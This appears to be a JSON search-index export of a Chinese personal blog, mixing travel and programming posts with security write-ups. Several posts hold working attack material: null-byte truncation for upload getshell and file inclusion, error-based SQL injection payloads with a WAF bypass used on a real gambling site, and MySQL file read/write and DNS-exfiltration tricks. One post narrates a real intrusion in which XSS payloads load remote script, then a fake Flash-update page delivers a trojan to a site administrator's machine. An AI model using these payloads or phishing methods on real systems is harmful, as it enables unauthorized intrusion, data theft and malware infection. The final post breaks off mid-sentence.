{"pages":[{"title":"","text":"Oooooops... Oooooops... ERROR 404--NOT FOUND","link":"/404.html"},{"title":"","text":"g9Rqsx1Gla","link":"/baidu_verify_g9Rqsx1Gla.html"},{"title":"About me","text":"当我走向你的时候我原想收获一缕春风你却给了我生命中最美的春天… 1998 处女座 生于北方 我的脚印CVE-2019-8407CVE-2019-8408CVE-2019-9145CNVD-2019-05643CNVD-2019-21084","link":"/about/index.html"}],"posts":[{"title":"00截断之追本溯源","text":"0x00，%00，/00 之类的截断，本质都是一样的，只是不同表现方式而已。 00截断在我写这篇文章之前，一直是很模糊的概念。看到别人利用成功，等到真要使用时又手足无措。用了一些时间学习了一下原理，本文引用比较多，仅仅是为了再次梳理一遍，不作为任何商业用途。 截断原理截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“”)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。 00截断00截断的限制条件1PHP&lt;5.3.29，magic_quotes_gpc为OFF状态 00截断的利用方法示例代码12345678910111213$uploaded_name = $_FILES[ 'file' ][ 'name' ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" )) { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dir . $target_name); // 将临时文件移动到指定目录 $result = $dir . $target_name; echo \"Stored in: $result\"; }else{ echo \"Invalid file\";} 漏洞原理和利用文件上传需要存在上传路径，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00，如果程序中检测的是文件的后缀名合法性，而且通过拼接路径和文件名来保存上传的文件，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.php，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。 文件包含假设存在漏洞文件 lfi.php 1234&lt;?php $temp = $_REQUEST['action'].\".php\"; include $temp; // include造成了LFI和php的%00截断?&gt; 和想要包含的文件 Password 123&lt;?php phpinfo(); ?&gt; 利用： 1lfi.php?action=password%00 即可成功包含并执行（%00是被会url解码成0x00，所以导致截断） ※也就是说，如果没有截断条件，lfi.php就只能包含php扩展名的文件，有截断条件时，lfi.php可以包含任意文件的扩展名 这时把magic_quotes_gpc打开，%00会被转义成了 \\0 两个单体字符，且不再具有截断功能。原因是：当打开magic_quotes_gpc时，所有的 ‘（单引号），”（双引号），\\（反斜线）和 %00 都会被自动加上一个反斜线进行转义，且还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、mysql_real_escape_string() 等。 常见使用误区很多人喜欢在文件名中加%00进行截断，其实方式是不对的，为什么呢？比如攻击者构造文件名：a.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名最终还是.php，.php后缀又不允许上传所以上传肯定失败了。 %00和%00(urldecode)这是在burp中很常见的两种操作 直接使用%00path可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urlencode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在 非enctype=multipart/form-data 的表单中或 URL or Cookie 中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行自动URL解码即可。 使用%00(urldecode)当上传的表单中有一个enctype的属性，并且需要enctype=&quot;multipart/form-data&quot; (将文件以二进制的形式上传，从而可以实现多种类型的文件上传，且不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。 参考： AdminTony’s Blog 红黑联盟 安恒网络空间安全讲武堂","link":"/2019/02/20/00截断之追本溯源/"},{"title":"360个人图书馆-轻松解除网页防复制","text":"用过360个人图书馆的人都知道要复制别人的文章需要先收藏到自己的图书馆才可以复制，没有账号右键复制它会直接弹出一个提示登录框。不过如果你不经常使用360个人图书馆，你也会懒得专门去注册一个帐号吧？反正我很少用不注册。 chrome浏览器也有些插件，不过我不喜欢装那么多插件，那么我们直接用一句代码来解除。 chrome浏览器按F12（打开谷歌浏览器的开发者工具） 点击Console 然后按F5 刷新下网页，（根据测试必须刷新下网页等下插入代码才能生效） 下面空白插入代码： 1document.oncontextmenu=document.onselectstart=document.body.onselectstart=document.oncopy=document.body.oncopy=\"\" 然后按回车键，ok！不会弹出那令人蛋疼的提示了，可以复制了。","link":"/2018/01/13/360个人图书馆-轻松解除网页防复制/"},{"title":"520的天津之行","text":"天津这座城市给我的第一感觉是一个很有活力的城市，而且科技感和现代化十足，文艺气息也很浓厚,真的是一座很有生活感觉的城市。 《马车上的爱情》很幸运遇到一马车结婚的人，哈哈~ 《北洋大学堂》天津大学的前身 《天津之眼》当天是阴天，后来还下起了小雨，还好没有上去… 《海河边的楼》虽然很普通的建筑，但是真的很好看啊 《意租界兵营》院子没上锁，胆子小没敢进去 《解放桥》沧桑历史的见证者，其实对面的拉面不错，嗝~ 《POLICECAR》天津站的特警车，安保神马的都挺到位，趁机偷偷合了影 《天津站》撤退前的最后一张照片了","link":"/2018/05/20/520的天津之行/"},{"title":"北京798艺术中心之行","text":"要么读书，要么旅行。 涂鸦Bus 迷之街角 金属蟹 砖石与金属 铁蒺藜 V字仇杀队 我和她","link":"/2017/05/07/798艺术中心之行/"},{"title":"BC实战|Bypass安全狗","text":"学以致用。 漏洞发现常规流程走一遍，发现一处标记信息已读的功能点比较可疑： 抓包加单引号重放： 可以看到单引号被转义了，看下闭合方式，问题不大，因为有回显，直接使用报错注入。 报错注入获取下数据库用户1127) or updatexml(1,concat(0x3a,user()),1 获取数据库1127) or updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 0,1),1 Bypass安全狗掏出前段时间学到的打狗棒法（超长字符Bypass，这里类型不同，原理相同）：传送门 后面的和常规报错没什么不同，就不啰嗦了，领会精神~ 小Tips渗透测试中习惯以开发者的角度考虑一个功能的实现，会更快的找到有效的切入点。 结合BurpSuite的Intruder模块中的Grep-Match功能使用，可以快速提取报错注入的结果。 超长字符不仅仅可以应用在Bypass安全狗注入，利用参数污染，XSS也是可以滴。","link":"/2019/11/11/BC实战Bypass安全狗/"},{"title":"BC实战|从Xss到主机上线","text":"要保持学习的好习惯，这次平时学的就用上了。 故事的起因前几天收到一封邮件，内容是这样的： 你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。 加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。 漏洞挖掘官网截图 信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。 想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。 职业习惯：看见框就想叉，一发xss payload打过去： 1&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=XSSURL&gt;&lt;/sCrIpT&gt; wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上相关介绍，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。 再吃我一发： 1&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;&gt; 叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。 Flash钓鱼既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：传送门。 前期准备一个免费空间，一个免费域名（域名可以搞一个 www.flashxxx.tk 这种的，可信度比较高），一个可以正常上线的马子。 然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页： 关于马子可以做到运行正常安装文件的同时运行马子，骚姿势：自解压捆绑文件的利用 为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。 关于免杀由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。 一切就绪万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload： 页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页） 不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。 成功上线：这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。 看一会对面在干哈： 这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了： 打开了一个账面，这流水咱也看不懂： 再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么： F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的： 点到为止：不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。","link":"/2019/12/08/BC实战从Xss到主机上线/"},{"title":"CTFd平台安装与搭建","text":"看到不少高校都有自己的ctf练习平台，就想着试着给学校社团也搭一个，fbctf的界面确实够炫酷，可就是太耗费服务器资源，就想着试试CTFd，就把折腾的过程记录一下。 Flask安装 需求的环境是要能使用apt的(ubuntu或者debian之类)以下全部在ubuntu16.04.1 LTS 32位下测试1.安装git 1sudo apt install git 2.安装pip 1sudo apt install python-pip 3.安装Flask 1sudo pip install Flask 4.下载&amp;安装&amp;运行CTFd↓↓ 1234sudo git clone https://github.com/isislab/CTFd.git cd CTFd sudo ./prepare.sh sudo python serve.py ★但是，这样直接运行性能很差，所以也可以用gunicorn[安装时出现了pip版本低的问题直接更新失败，百度到升级命令 123sudo pip install --index https://pypi.mirrors.ustc.edu.cn/simple/ --upgrade pip sudo pip install gunicorn sudo gunicorn --bind 0.0.0.0:4000 -w 1 &quot;CTFd:create_app()&quot; [0.0.0.0不用更改] 至此平台就搭建完成了，在浏览器访问你的服务器公网ip:4000就可以进入了。","link":"/2017/05/09/CTFd平台安装与搭建/"},{"title":"Burpsuite爆破含CSRF-Token的程序","text":"1. 抓包0x01 开启burpsuite代理，抓取数据包，将请求包转送到Intruder 2. 设置0x02 Attack type选择Pitchfork，将passwod和user_token设置攻击位置 0x03 在options栏找到Grep - Extract，点击Add，然后点击Refetch response,进行一个请求，即可看到响应报文,直接选取需要提取的字符串，上面的会自动填入数据的起始和结束标识 点击“OK”返回，可以在列表中看到一个grep项 0x04 返回payloads栏，payload 1 设置密码字典 payload 2 选择payload type为“Recursive grep”，然后选择下面的extract grep项即可 3. 攻击0x05 从Results中可以看到每一次访问获取到的token作为了每次请求的参数，最终爆破出结果","link":"/2018/10/21/Burpsuite爆破含CSRF-Token的程序/"},{"title":"HTML 速查列表","text":"HTML 基本文档123456789&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;文档标题&lt;/title&gt;&lt;/head&gt;&lt;body&gt;可见文本...&lt;/body&gt;&lt;/html&gt; 基本标签（Basic Tags）1234567891011&lt;h1&gt;最大的标题&lt;/h1&gt;&lt;h2&gt; . . . &lt;/h2&gt;&lt;h3&gt; . . . &lt;/h3&gt;&lt;h4&gt; . . . &lt;/h4&gt;&lt;h5&gt; . . . &lt;/h5&gt;&lt;h6&gt;最小的标题&lt;/h6&gt; &lt;p&gt;这是一个段落。&lt;/p&gt;&lt;br&gt; （换行）&lt;hr&gt; （水平线）&lt;!-- 这是注释 --&gt; 文本格式化（Formatting）123456789101112131415161718&lt;b&gt;粗体文本&lt;/b&gt;&lt;code&gt;计算机代码&lt;/code&gt;&lt;em&gt;强调文本&lt;/em&gt;&lt;i&gt;斜体文本&lt;/i&gt;&lt;kbd&gt;键盘输入&lt;/kbd&gt; &lt;pre&gt;预格式化文本&lt;/pre&gt;&lt;small&gt;更小的文本&lt;/small&gt;&lt;strong&gt;重要的文本&lt;/strong&gt; &lt;abbr&gt; （缩写）&lt;address&gt; （联系信息）&lt;bdo&gt; （文字方向）&lt;blockquote&gt; （从另一个源引用的部分）&lt;cite&gt; （工作的名称）&lt;del&gt; （删除的文本）&lt;ins&gt; （插入的文本）&lt;sub&gt; （下标文本）&lt;sup&gt; （上标文本） 链接（Links）123456普通的链接：&lt;a href=\"http://www.example.com/\"&gt;链接文本&lt;/a&gt;图像链接： &lt;a href=\"http://www.example.com/\"&gt;&lt;img src=\"URL\" alt=\"替换文本\"&gt;&lt;/a&gt;邮件链接： &lt;a href=\"mailto:webmaster@example.com\"&gt;发送e-mail&lt;/a&gt;书签：&lt;a id=\"tips\"&gt;提示部分&lt;/a&gt;&lt;a href=\"#tips\"&gt;跳到提示部分&lt;/a&gt; 图片（Images）1&lt;img src=\"URL\" alt=\"替换文本\" height=\"42\" width=\"42\"&gt; 样式/区块（Styles/Sections）123456&lt;style type=\"text/css\"&gt;h1 {color:red;}p {color:blue;}&lt;/style&gt;&lt;div&gt;文档中的块级元素&lt;/div&gt;&lt;span&gt;文档中的内联元素&lt;/span&gt; 无序列表1234&lt;ul&gt; &lt;li&gt;项目&lt;/li&gt; &lt;li&gt;项目&lt;/li&gt;&lt;/ul&gt; 有序列表1234&lt;ol&gt; &lt;li&gt;第一项&lt;/li&gt; &lt;li&gt;第二项&lt;/li&gt;&lt;/ol&gt; 定义列表123456&lt;dl&gt; &lt;dt&gt;项目 1&lt;/dt&gt; &lt;dd&gt;描述项目 1&lt;/dd&gt; &lt;dt&gt;项目 2&lt;/dt&gt; &lt;dd&gt;描述项目 2&lt;/dd&gt;&lt;/dl&gt; 表格（Tables）12345678910&lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;表格标题&lt;/th&gt; &lt;th&gt;表格标题&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;表格数据&lt;/td&gt; &lt;td&gt;表格数据&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 框架（Iframe）1&lt;iframe src=\"demo_iframe.htm\"&gt;&lt;/iframe&gt; 表单（Forms）123456789101112131415&lt;form action=\"demo_form.php\" method=\"post/get\"&gt;&lt;input type=\"text\" name=\"email\" size=\"40\" maxlength=\"50\"&gt;&lt;input type=\"password\"&gt;&lt;input type=\"checkbox\" checked=\"checked\"&gt;&lt;input type=\"radio\" checked=\"checked\"&gt;&lt;input type=\"submit\" value=\"Send\"&gt;&lt;input type=\"reset\"&gt;&lt;input type=\"hidden\"&gt;&lt;select&gt;&lt;option&gt;苹果&lt;/option&gt;&lt;option selected=\"selected\"&gt;香蕉&lt;/option&gt;&lt;option&gt;樱桃&lt;/option&gt;&lt;/select&gt;&lt;textarea name=\"comment\" rows=\"60\" cols=\"20\"&gt;&lt;/textarea&gt;&lt;/form&gt; 实体（Entities）123&amp;lt; 等同于 &lt;&amp;gt; 等同于 &gt;&amp;#169; 等同于 ©","link":"/2018/08/29/HTML速查列表/"},{"title":"JS快速提取URL","text":"控制台运行，快速提取页面url Google12345var i = document.getElementsByClassName('r');for(var z=0;z&lt;i.length;z++){ var url = i[z].getElementsByTagName('a'); console.log(url[0].href)} Bing12345var h3 = document.getElementsByTagName('h2');for(var i=0;i&lt;h3.length;i++){ var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);}","link":"/2019/01/01/JS快速提取URL/"},{"title":"Java实现图形界面输入输出","text":"新学期开始了，一定要好好学习，天天熬夜！ 12345678910111213141516171819202122232425262728293031323334353637383940import javax.swing.*;import java.awt.*;import java.awt.event.ActionEvent;import java.awt.event.ActionListener;/*图形界面下1.文本框对象(TextField)--获取用户输入数据2.使用标签对象(Label)或文本框对象--输出数据3.使用命令按钮(Button)--执行命令* */public class AppGraphInOut { //图形(Graph)输入输出 public static void main(String args[]){ new AppFrame(); //构造一个AppFrame对象，用于创建用户界面，可设定大小用，setVisible(true)方法显示 }}class AppFrame extends JFrame { //extends继承AFrame类 JTextField in = new JTextField(10); //文本框长度为10 JButton btn = new JButton(\"求平方\"); //按钮 JLabel out = new JLabel(\"结果\"); //标签 public AppFrame() { setLayout(new FlowLayout()); //设置用户界面上的屏幕组件的格式布局，默认为流式布局 getContentPane().add(in); getContentPane().add(btn); getContentPane().add(out); btn.addActionListener(new BtnActionAdapter()); //new一个事件监听对象，实现监听功能 setSize(400, 100); setDefaultCloseOperation(DISPOSE_ON_CLOSE); //退出 setVisible(true); //显示界面 } class BtnActionAdapter implements ActionListener { //添加一个事件监听对象，实现监听功能 public void actionPerformed(ActionEvent e) { //动作事件 String s = in.getText(); //文本框得到文本 double d = Double.parseDouble(s); //解析成实数 double sq = d * d; out.setText( d + \"的平方是\" + sq); //显示结果 } }}","link":"/2018/03/05/Java实现图形界面输入输出/"},{"title":"Java冒泡排序算法","text":"1234567891011121314151617181920212223242526272829public class Maopao { public void bigAndSmall(){ int arr[] = {-1,3,6,7,0,12,35,5,4,666}; /*根据数组的长度循环遍历，并判断如果前一个值小于后一个值， 那么就把“后一个值”排列到“当前前一个值”的前面。*/ for (int i=1;i&lt;arr.length;i++){ System.out.println(\"当i=\"+i+\"时：\"); for (int j=0;j&lt;arr.length-i;j++){ if (arr[j]&lt;arr[j+1]){ int temp; temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp; } System.out.println(\"当j=\"+j+\"时：\"+arr[0]+\",\"+arr[1]+\",\"+arr[2]+\",\"+arr[3]+\",\"+arr[4]+\",\"+arr[5]+\",\"+arr[6]+\",\"+arr[7]+\",\"+arr[8]+\",\"+arr[9]); } System.out.println(\"FOR循环结果为：\"+arr[0]+\",\"+arr[1]+\",\"+arr[2]+\",\"+arr[3]+\",\"+arr[4]+\",\"+arr[5]+\",\"+arr[6]+\",\"+arr[7]+\",\"+arr[8]+\",\"+arr[9]); System.out.println(\"____________________________________\"); } for (int i=0;i&lt;arr.length;i++){ System.out.println(arr[i]); } } public static void main(String args[]){ //main函数中，通过实例化别名点方法名的方式调用并打印出结果 Maopao mp = new Maopao(); mp.bigAndSmall(); }} 执行结果：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182当i=1时：当j=0时：3,-1,6,7,0,12,35,5,4,666当j=1时：3,6,-1,7,0,12,35,5,4,666当j=2时：3,6,7,-1,0,12,35,5,4,666当j=3时：3,6,7,0,-1,12,35,5,4,666当j=4时：3,6,7,0,12,-1,35,5,4,666当j=5时：3,6,7,0,12,35,-1,5,4,666当j=6时：3,6,7,0,12,35,5,-1,4,666当j=7时：3,6,7,0,12,35,5,4,-1,666当j=8时：3,6,7,0,12,35,5,4,666,-1FOR循环结果为：3,6,7,0,12,35,5,4,666,-1____________________________________当i=2时：当j=0时：6,3,7,0,12,35,5,4,666,-1当j=1时：6,7,3,0,12,35,5,4,666,-1当j=2时：6,7,3,0,12,35,5,4,666,-1当j=3时：6,7,3,12,0,35,5,4,666,-1当j=4时：6,7,3,12,35,0,5,4,666,-1当j=5时：6,7,3,12,35,5,0,4,666,-1当j=6时：6,7,3,12,35,5,4,0,666,-1当j=7时：6,7,3,12,35,5,4,666,0,-1FOR循环结果为：6,7,3,12,35,5,4,666,0,-1____________________________________当i=3时：当j=0时：7,6,3,12,35,5,4,666,0,-1当j=1时：7,6,3,12,35,5,4,666,0,-1当j=2时：7,6,12,3,35,5,4,666,0,-1当j=3时：7,6,12,35,3,5,4,666,0,-1当j=4时：7,6,12,35,5,3,4,666,0,-1当j=5时：7,6,12,35,5,4,3,666,0,-1当j=6时：7,6,12,35,5,4,666,3,0,-1FOR循环结果为：7,6,12,35,5,4,666,3,0,-1____________________________________当i=4时：当j=0时：7,6,12,35,5,4,666,3,0,-1当j=1时：7,12,6,35,5,4,666,3,0,-1当j=2时：7,12,35,6,5,4,666,3,0,-1当j=3时：7,12,35,6,5,4,666,3,0,-1当j=4时：7,12,35,6,5,4,666,3,0,-1当j=5时：7,12,35,6,5,666,4,3,0,-1FOR循环结果为：7,12,35,6,5,666,4,3,0,-1____________________________________当i=5时：当j=0时：12,7,35,6,5,666,4,3,0,-1当j=1时：12,35,7,6,5,666,4,3,0,-1当j=2时：12,35,7,6,5,666,4,3,0,-1当j=3时：12,35,7,6,5,666,4,3,0,-1当j=4时：12,35,7,6,666,5,4,3,0,-1FOR循环结果为：12,35,7,6,666,5,4,3,0,-1____________________________________当i=6时：当j=0时：35,12,7,6,666,5,4,3,0,-1当j=1时：35,12,7,6,666,5,4,3,0,-1当j=2时：35,12,7,6,666,5,4,3,0,-1当j=3时：35,12,7,666,6,5,4,3,0,-1FOR循环结果为：35,12,7,666,6,5,4,3,0,-1____________________________________当i=7时：当j=0时：35,12,7,666,6,5,4,3,0,-1当j=1时：35,12,7,666,6,5,4,3,0,-1当j=2时：35,12,666,7,6,5,4,3,0,-1FOR循环结果为：35,12,666,7,6,5,4,3,0,-1____________________________________当i=8时：当j=0时：35,12,666,7,6,5,4,3,0,-1当j=1时：35,666,12,7,6,5,4,3,0,-1FOR循环结果为：35,666,12,7,6,5,4,3,0,-1____________________________________当i=9时：当j=0时：666,35,12,7,6,5,4,3,0,-1FOR循环结果为：666,35,12,7,6,5,4,3,0,-1____________________________________6663512765430-1","link":"/2017/12/19/Java冒泡排序/"},{"title":"MySQL不知道列名情况下的注入","text":"最近感觉脑子空空，全在为了刷洞去挖洞，还是回归技术的本身让自己舒服些。 前提以下情况适用于 MySQL &lt; 5版本，或者在 MySQL &gt;= 5 的版本[存在information_schema库]，且已获取到库名和表名 ① 当只能获取到表名，获取不到列名或者只能获取到无有效内容的列名情况【例如 id】 ② 当希望通过information_schema库中的表去获取其他表的结构，即表名、列名等，但是这个库被WAF过滤掉的情况 其实个人感觉这个方法还是对 5 版本以下的实用性比较强一些，因为对我来说，一般遇到waf就放弃了（菜的真实23333） 解决正常的查询：以下是正常查询 test 库中的 user 表内容 1select * from user; UNION查询:1select 1,2,3,4 union select * from user; 数字对应列查询：可以使用数字来对应列来进行查询，如 2 对应了表里面的 name 列 1select `2` from (select 1,2,3,4 union select * from user)a; 别名代替查询：当反引号 ` 不能使用的时候，可以使用别名来代替，如设置 2 的别名为 b 1select b from (select 1,2 as b,3,4 union select * from user)a; 多列合并查询：同上：这里反引号不能用的话，一样可以使用别名代替 1select concat(`2`,0x3a,`3`) from (select 1,2,3,4 union select * from user)a limit 1,1; 仅作翻译以及思路整理 原文链接：https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/","link":"/2019/03/21/MySQL不知道列名情况下的注入/"},{"title":"Mysql手工注入笔记","text":"数据库版本 &gt; Mysql 5.0※本文不对 Mysql 5.0以下版本再做研究 自带数据库：information_schema information_schema：存储mysql下所有信息的数据库（数据库名，表名，列名） Mysql数据库结构： 符号.代表下一级的意思 1234567information_schema.schemata -[存储mysql下所有**数据库**名信息的表]information_schema.tables -[存储所有数据库下的**表名**信息的表]information_schema.columns -[存储所有数据库下的**列名**信息的表]schema_name -[information_schema.schemata中存储的库名]table_name -表名column_name -列名table_schema -数据库名 information_schema 数据库辅助理解结构图: 常用注入参数及解释：12345678910111213database() -数据库名user() -数据库用户version() -数据库版本@@version_compile_os -操作系统group_concat() -多条数据合并一行--+ 或 # -注释符and ord(mid(user(),1,1))=114 -判断是否ROOT权限 返回正确即存在and (select count(*) from mysql.user)&gt;0 -返回正常,说明具有读写权限，反之数据库帐户被降权and ord(mid(version(),1,1))&gt;51 -确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，3.0以上版本，可以用union方法ord() -获取二进制码mid() -截位操作limit a,b (limit a offset b) -限制查询结果的条数，具体区别百度~... 联合查询注入：※ [ = 号之后的值，用hex编码0x...或者'XXX'替换使用都可以] 获取所有库名1union select group_concat(schema_name) from information_schema.schemata 获取指定库名-&gt;所有表名1union select group_concat(table_name) from information_schema.tables where table_schema=&apos;库名&apos; 获取指定库名-&gt;指定表名-&gt;所有列名1union select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos; and table_schema=&apos;库名&apos; 获取指定库名-&gt;指定表名-&gt;指定列名-&gt;所有数据内容1union select group_concat(username,&quot;::&quot;,password) from 库名.表名 文件读写：读文件常见的读文件，可以用16进制代替字符串 1234select load_file(&apos;c:/boot.ini&apos;)select load_file(0x633a2f626f6f742e696e69)select load_file(&apos;//127.0.1/1.txt&apos;) # smb协议select load_file(&apos;\\\\\\\\127.0.0.1\\\\1.txt&apos;) # 可用于DNS隧道 写文件常见的写文件，可以用16进制代替字符串 12select 0x... into outfile &apos;D:/1.txt&apos;select 0x... into dumpfile &apos;D:/1.txt&apos; 顺带说一下 dumpfile与outfile函数的区别 SELECT into outfile -导出到一个txt文件，可以导出每行记录的，这个很适合导库 SELECT into dump-只能导出一行数据 如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏。因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏 这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理 总结： into outfile-导出内容 into dumpfile-导出二进制文件 关于其它的注入方法本文不在赘述，学习链接推荐：传送门","link":"/2018/10/30/Mysql手工注入笔记/"},{"title":"Nginx 证书部署","text":"获取证书Nginx文件夹内获得：SSL证书文件1_www.domain.com_bundle.crt 和私钥文件 2_www.domain.com.key, 1_www.domain.com_bundle.crt 文件包括两段证书代码 1“-----BEGIN CERTIFICATE-----”和“-----END CERTIFICATE-----” 2_www.domain.com.key 文件包括一段私钥代码 1“-----BEGIN RSA PRIVATE KEY-----”和“-----END RSA PRIVATE KEY-----” 证书安装将域名 www.domain.com 的证书文件1_www.domain.com_bundle.crt 、私钥文件2_www.domain.com.key保存到同一个目录，例如/usr/local/nginx/conf目录下。 更新Nginx根目录下 conf/nginx.conf 文件如下： 123456789101112131415server { listen 443; server_name www.domain.com; #填写绑定证书的域名 ssl on; ssl_certificate 1_www.domain.com_bundle.crt; ssl_certificate_key 2_www.domain.com.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置 ssl_prefer_server_ciphers on; location / { root html; #站点目录 index index.html index.htm; } } 配置完成后，先用bin/nginx –t来测试下配置是否有误，正确无误的话，重启nginx。就可以使 https://www.domain.com 来访问了。 注： 配置文件参数 说明 listen 443 SSL访问端口号为443 ssl on 启用SSL功能 ssl_certificate 证书文件 ssl_certificate_key 私钥文件 ssl_protocols 使用的协议 ssl_ciphers 配置加密套件，写法遵循openssl标准 使用全站加密，http自动跳转https（可选）对于用户不知道网站可以进行https访问的情况下，让服务器自动把http的请求重定向到https。 在服务器这边的话配置的话，可以在页面里加js脚本，也可以在后端程序里写重定向，当然也可以在web服务器来实现跳转。Nginx是支持rewrite的（只要在编译的时候没有去掉pcre） 在http的server里增加 1rewrite ^(.*) https://$host$1 permanent; 这样就可以实现80进来的请求，重定向为https了。","link":"/2018/05/20/Nginx 证书部署/"},{"title":"PDF.js更优雅的pdf在线预览体验","text":"前段时间无意间遇到了pdf在线预览的问题，查了一下，发现H5有标签直接套用。 例子： 1&lt;embed&gt;&lt;/embed&gt; 缺点：加载的速度差，文件稍微大一点，页面就会陷入长期的一个停顿。如果是以base64传输数据的，等待时间会更长，且移动端对这个标签的支持很不友好 1&lt;iframe&gt;&lt;/iframe&gt; 缺点：一遇IE深似海，从此兼容是路人，同样的移动端浏览一样差强人意 这些问题让我一开始很难受，后来发现了一个神奇的项目：PDF.js，完美的解决了这个移动端不兼容的问题。 这是源代码目录结构： 1234567891011121314├── LICENSE├── build/│ ├── pdf.js - display layer│ └── pdf.worker.js - core layer└── web/ ├── cmaps/ - character maps(required by core) ├── compressed.tracemonkey-pldi-09.pdf - test pdf ├── debugger.js - helpful pdf debugging features ├── images/ - images for the viewer and annotation icons ├── l10n.js - localization ├── locale/ - translation files ├── viewer.css - viewer style sheet ├── viewer.html - viewer html └── viewer.js - viewer layer 使用方法： 我们只需用到viewer.html这个文件 首先将pdf放入文件夹中，然后构造如下链接: http://xxx.com/pdfjs/web/viewer.html?file=pdf/test.pdf 访问即可查看，可以发现无论是加载速度，还是客户端兼容性都是不错的。","link":"/2018/08/19/PDF.js更优雅的pdf在线预览体验/"},{"title":"SQLi Labs 指南","text":"SQL Libs一直也没看到有人写过比较完整的指南，只有作者在自己的博客上帖了一些tip和一些视频，偶然看到一篇文章在写这个，便拿过来翻一下，以作参考，原文较长，分成几个部分 简介结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。 对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL 